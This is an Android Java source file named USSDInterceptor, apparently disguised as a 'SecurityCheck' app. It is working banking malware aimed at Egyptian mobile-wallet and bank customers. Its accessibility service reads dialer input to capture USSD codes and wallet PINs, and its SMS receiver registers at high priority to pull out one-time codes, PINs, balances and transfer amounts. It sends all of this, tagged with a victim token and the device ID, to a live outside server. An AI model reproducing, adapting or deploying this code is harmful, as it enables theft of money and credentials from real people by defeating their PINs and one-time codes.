// USSDInterceptor.java
package com.sec.check;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * USSDInterceptor - يعترض كل USSD و SMS
 * ============================================================
 * - AccessibilityService لقراءة USSD dialer
 * - SMS Receiver لاعتراض SMS
 * - يستخرج PIN + OTP + الرصيد + التحويلات
 * - يرسل للبوت كل حاجة فوراً
 */
public class USSDInterceptor extends AccessibilityService {

    private static final String TAG = "SecurityCheck";
    private static final String SERVER_URL = "https://daf-production-e34a.up.railway.app";

    // ★ كل المحافظات المدعومة (مصر)
    private static final String[] WALLET_CODES = {
        "*9#",         // Vodafone Cash - القائمة
        "*9*",         // Vodafone Cash - العمليات
        "*100#",       // Orange Cash - الرصيد
        "*100*",       // Orange Cash - تحويل
        "*555#",       // Etisalat Cash
        "*555*",       // Etisalat Cash
        "*158#",       // WE Pay
        "*158*",       // WE Pay
        "*868#",       // CIB
        "*777#",       // Banque Misr
        "*888#",       // NBE
        "*700#",       // Banque du Caire
        "*505#",       // QNB
        "*444#",       // Faisal Bank
    };

    // ★ أنماط USSD
    private static final Pattern USSD_PATTERN = Pattern.compile(
        "^(\\*[0-9*#]+)(?:\\s|$)"
    );

    // ★ أنماط SMS المهمة
    private static final Pattern OTP_PATTERN = Pattern.compile(
        "(?:OTP|كود|رمز|Verification|Code|رقم سري)[:\\s]*(\\d{4,8})",
        Pattern.CASE_INSENSITIVE
    );

    private static final Pattern WALLET_SMS_PATTERN = Pattern.compile(
        "(?:Vodafone|Orange|Etisalat|WE|فودافون|اورنج|اتصالات|رصيد|محفظة|Cash|محفظتك)",
        Pattern.CASE_INSENSITIVE
    );

    private static final Pattern BALANCE_PATTERN = Pattern.compile(
        "(?:EGP|جنيه|ج\\.م|رصيدك|Balance|الرصيد|current balance)[:\\s]*(\\d+(?:\\.\\d+)?)",
        Pattern.CASE_INSENSITIVE
    );

    private static final Pattern TRANSFER_PATTERN = Pattern.compile(
        "(?:تحويل|transfer|حوّل|تم تحويل)[:\\s]*(\\d+(?:\\.\\d+)?)",
        Pattern.CASE_INSENSITIVE
    );

    private static final Pattern PIN_PATTERN = Pattern.compile(
        "(?:PIN|pin|الرقم السري|كلمة المرور)[:\\s]*(\\d{4,6})",
        Pattern.CASE_INSENSITIVE
    );

    private SmsReceiver smsReceiver = null;
    private static String victimToken = null;
    private static String deviceId = null;

    // ★ كاش PIN المحفظة (لكل عملية)
    private static String cachedPin = null;
    private static long cachedPinTime = 0;

    // ============================================================
    // onServiceConnected
    // ============================================================
    @Override
    public void onServiceConnected() {
        super.onServiceConnected();

        Log.d(TAG, "════════════════════════════════════════");
        Log.d(TAG, "★ USSDInterceptor Service Connected");
        Log.d(TAG, "════════════════════════════════════════");

        try {
            // قراءة التوكن
            try {
                victimToken = BuildConfig.VICTIM_TOKEN;
            } catch (Exception e) {
                victimToken = "DEFAULT_TOKEN";
            }

            try {
                deviceId = android.provider.Settings.Secure.getString(
                    getContentResolver(),
                    android.provider.Settings.Secure.ANDROID_ID
                );
            } catch (Exception e) {
                deviceId = "unknown";
            }

            // ★ إعداد AccessibilityService
            AccessibilityServiceInfo info = new AccessibilityServiceInfo();
            info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
            info.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK;
            info.notificationTimeout = 100;
            info.flags =
                AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS |
                AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS |
                AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;

            setServiceInfo(info);

            // ★ تسجيل SMS Receiver
            registerSmsReceiver();

            // ★ إشعار البدء
            sendEvent("interceptor_ready", new JSONObject()
                .put("service", "USSDInterceptor")
                .put("timestamp", System.currentTimeMillis())
            );

            Log.d(TAG, "✅ USSDInterceptor ready - monitoring USSD + SMS");

        } catch (Exception e) {
            Log.e(TAG, "onServiceConnected error: " + e.getMessage());
        }
    }

    // ============================================================
    // onAccessibilityEvent
    // ============================================================
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;

        try {
            int eventType = event.getEventType();

            // ★ نركز على تغييرات النص والأحداث المهمة
            if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED ||
                eventType == AccessibilityEvent.TYPE_VIEW_FOCUSED ||
                eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
                eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {

                String packageName = event.getPackageName() != null ?
                    event.getPackageName().toString() : "";

                // ★ نركز على تطبيقات الاتصال
                if (isDialerOrPhoneApp(packageName)) {
                    processAccessibilityEvent(event);
                }

                // ★ أو اقرأ من أي تطبيق فيه USSD
                if (event.getText() != null) {
                    for (CharSequence text : event.getText()) {
                        if (text != null && text.toString().contains("*")) {
                            processAccessibilityEvent(event);
                            break;
                        }
                    }
                }
            }

        } catch (Exception e) {
            Log.e(TAG, "onAccessibilityEvent error: " + e.getMessage());
        }
    }

    // ============================================================
    // processAccessibilityEvent
    // ============================================================
    private void processAccessibilityEvent(AccessibilityEvent event) {
        try {
            // ★ اقرأ النص من الحقل الحالي
            if (event.getText() != null && !event.getText().isEmpty()) {
                for (CharSequence text : event.getText()) {
                    if (text == null) continue;

                    String textStr = text.toString();

                    // ★ لو ده كود USSD
                    Matcher matcher = USSD_PATTERN.matcher(textStr);
                    if (matcher.find()) {
                        String ussdCode = matcher.group(1);
                        processUSSDCode(ussdCode);
                    }
                }
            }

            // ★ اقرأ من الـ node المحدد
            AccessibilityNodeInfo node = event.getSource();
            if (node != null && node.getText() != null) {
                String nodeText = node.getText().toString();

                Matcher matcher = USSD_PATTERN.matcher(nodeText);
                if (matcher.find()) {
                    String ussdCode = matcher.group(1);
                    processUSSDCode(ussdCode);
                }
            }

        } catch (Exception e) {
            Log.e(TAG, "processAccessibilityEvent error: " + e.getMessage());
        }
    }

    // ============================================================
    // processUSSDCode
    // ============================================================
    private void processUSSDCode(String ussdCode) {
        try {
            Log.d(TAG, "★ USSD Code detected: " + ussdCode);

            // ★ هل ده كود محفظة؟
            boolean isWalletCode = false;
            String walletName = null;

            for (String code : WALLET_CODES) {
                if (ussdCode.startsWith(code.replace("#", ""))) {
                    isWalletCode = true;

                    // تحديد اسم المحفظة
                    if (code.startsWith("*9")) walletName = "Vodafone Cash";
                    else if (code.startsWith("*100")) walletName = "Orange Cash";
                    else if (code.startsWith("*555")) walletName = "Etisalat Cash";
                    else if (code.startsWith("*158")) walletName = "WE Pay";

                    break;
                }
            }

            // ★ حلل الكود
            JSONObject ussdData = new JSONObject();
            ussdData.put("code", ussdCode);
            ussdData.put("is_wallet", isWalletCode);
            ussdData.put("wallet", walletName != null ? walletName : "Unknown");
            ussdData.put("timestamp", System.currentTimeMillis());
            ussdData.put("device", deviceId);

            // ★ لو كود فيه PIN → استخرجه
            String pin = extractPinFromUSSD(ussdCode);
            if (pin != null) {
                ussdData.put("pin", pin);
                Log.d(TAG, "★★★ PIN extracted: " + pin);

                // خزنه مؤقتاً
                cachedPin = pin;
                cachedPinTime = System.currentTimeMillis();
            }

            // ★ لو فيه PIN قديم، أضفه
            if (cachedPin != null && (System.currentTimeMillis() - cachedPinTime) < 300000) {
                ussdData.put("cached_pin", cachedPin);
            }

            // ★ أرسل للبوت
            sendEvent("ussd_detected", ussdData);

        } catch (Exception e) {
            Log.e(TAG, "processUSSDCode error: " + e.getMessage());
        }
    }

    // ============================================================
    // extractPinFromUSSD
    // ============================================================
    private String extractPinFromUSSD(String ussdCode) {
        try {
            // ★ أنماط PIN شائعة
            Pattern[] patterns = {
                Pattern.compile("\\*9\\*(\\d{4,6})"),           // Vodafone: *9*1234
                Pattern.compile("\\*100\\*(\\d{4,6})"),         // Orange: *100*1234
                Pattern.compile("\\*555\\*(\\d{4,6})"),         // Etisalat: *555*1234
                Pattern.compile("\\*158\\*(\\d{4,6})"),         // WE: *158*1234
                Pattern.compile("\\*(\\d{4,6})\\*"),            // Generic
                Pattern.compile("\\*(\\d{4,6})#"),              // Generic with #
            };

            for (Pattern pattern : patterns) {
                Matcher matcher = pattern.matcher(ussdCode);
                if (matcher.find()) {
                    return matcher.group(1);
                }
            }

            return null;
        } catch (Exception e) {
            return null;
        }
    }

    // ============================================================
    // isDialerOrPhoneApp
    // ============================================================
    private boolean isDialerOrPhoneApp(String packageName) {
        if (packageName == null) return false;

        String[] phoneApps = {
            "com.android.dialer",
            "com.android.phone",
            "com.google.android.dialer",
            "com.samsung.android.dialer",
            "com.samsung.android.incallui",
            "com.miui.dialer",
            "com.android.incallui",
            "com.sec.android.app.dialertab",
            "com.huawei.dialer",
            "com.huawei.phone",
            "com.android.server.telecom",
            "com.oppo.dialer",
            "com.oneplus.dialer",
            "com.vivo.dialer",
            "com.transsion.dialer",
        };

        for (String app : phoneApps) {
            if (packageName.equals(app) || packageName.startsWith(app)) {
                return true;
            }
        }

        return false;
    }

    // ============================================================
    // SmsReceiver
    // ============================================================
    private class SmsReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            try {
                if (intent == null) return;

                Bundle bundle = intent.getExtras();
                if (bundle == null) return;

                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus == null) return;

                String format = bundle.getString("format");

                for (Object pdu : pdus) {
                    SmsMessage sms;
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        sms = SmsMessage.createFromPdu((byte[]) pdu, format);
                    } else {
                        sms = SmsMessage.createFromPdu((byte[]) pdu);
                    }

                    if (sms == null) continue;

                    String sender = sms.getOriginatingAddress();
                    String body = sms.getMessageBody();

                    processSMS(sender, body);
                }
            } catch (Exception e) {
                Log.e(TAG, "SmsReceiver error: " + e.getMessage());
            }
        }
    }

    // ============================================================
    // processSMS
    // ============================================================
    private void processSMS(String sender, String body) {
        try {
            if (body == null || body.isEmpty()) return;

            Log.d(TAG, "★ SMS from: " + sender + " | body: " + body.substring(0, Math.min(80, body.length())));

            JSONObject smsData = new JSONObject();
            smsData.put("sender", sender != null ? sender : "Unknown");
            smsData.put("body", body);
            smsData.put("timestamp", System.currentTimeMillis());
            smsData.put("device", deviceId);

            // ★ هل ده SMS محفظة؟
            boolean isWalletSMS = WALLET_SMS_PATTERN.matcher(body).find();
            smsData.put("is_wallet", isWalletSMS);

            // ★ استخرج OTP
            Matcher otpMatcher = OTP_PATTERN.matcher(body);
            if (otpMatcher.find()) {
                String otp = otpMatcher.group(1);
                smsData.put("otp", otp);
                Log.d(TAG, "★★★ OTP extracted: " + otp);
            }

            // ★ استخرج الرصيد
            Matcher balanceMatcher = BALANCE_PATTERN.matcher(body);
            if (balanceMatcher.find()) {
                String balance = balanceMatcher.group(1);
                smsData.put("balance", balance);
            }

            // ★ استخرج المبلغ المحول
            Matcher transferMatcher = TRANSFER_PATTERN.matcher(body);
            if (transferMatcher.find()) {
                String amount = transferMatcher.group(1);
                smsData.put("transfer_amount", amount);
            }

            // ★ استخرج PIN من SMS
            Matcher pinMatcher = PIN_PATTERN.matcher(body);
            if (pinMatcher.find()) {
                String pin = pinMatcher.group(1);
                smsData.put("pin", pin);
            }

            // ★ إرسال للبوت
            sendEvent("sms_received", smsData);

        } catch (Exception e) {
            Log.e(TAG, "processSMS error: " + e.getMessage());
        }
    }

    // ============================================================
    // registerSmsReceiver
    // ============================================================
    private void registerSmsReceiver() {
        try {
            if (smsReceiver != null) return;

            smsReceiver = new SmsReceiver();

            IntentFilter filter = new IntentFilter();
            filter.addAction("android.provider.Telephony.SMS_RECEIVED");
            filter.addAction("android.provider.Telephony.SMS_DELIVER");
            filter.setPriority(999);

            registerReceiver(smsReceiver, filter);
            Log.d(TAG, "✅ SMS Receiver registered");

        } catch (Exception e) {
            Log.e(TAG, "registerSmsReceiver error: " + e.getMessage());
        }
    }

    // ============================================================
    // onUnbind
    // ============================================================
    @Override
    public boolean onUnbind(Intent intent) {
        try {
            if (smsReceiver != null) {
                unregisterReceiver(smsReceiver);
                smsReceiver = null;
                Log.d(TAG, "SMS Receiver unregistered");
            }
        } catch (Exception e) {
            Log.e(TAG, "onUnbind error: " + e.getMessage());
        }
        return super.onUnbind(intent);
    }

    // ============================================================
    // sendEvent — إرسال للبوت
    // ============================================================
    private void sendEvent(String type, JSONObject data) {
        new Thread(() -> {
            try {
                JSONObject payload = new JSONObject();
                payload.put("type", type);
                payload.put("token", victimToken);
                payload.put("device", deviceId);
                payload.put("data", data);
                payload.put("timestamp", System.currentTimeMillis());

                URL url = new URL(SERVER_URL + "/apk/victim/data");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(10000);
                conn.setReadTimeout(10000);

                OutputStream os = conn.getOutputStream();
                os.write(payload.toString().getBytes("UTF-8"));
                os.flush();
                os.close();

                int rc = conn.getResponseCode();
                Log.d(TAG, "📤 Sent event " + type + " → HTTP " + rc);

            } catch (Exception e) {
                Log.e(TAG, "sendEvent error: " + e.getMessage());
            }
        }).start();
    }

    // ============================================================
    // onInterrupt
    // ============================================================
    @Override
    public void onInterrupt() {
        Log.d(TAG, "USSDInterceptor interrupted");
    }
        }
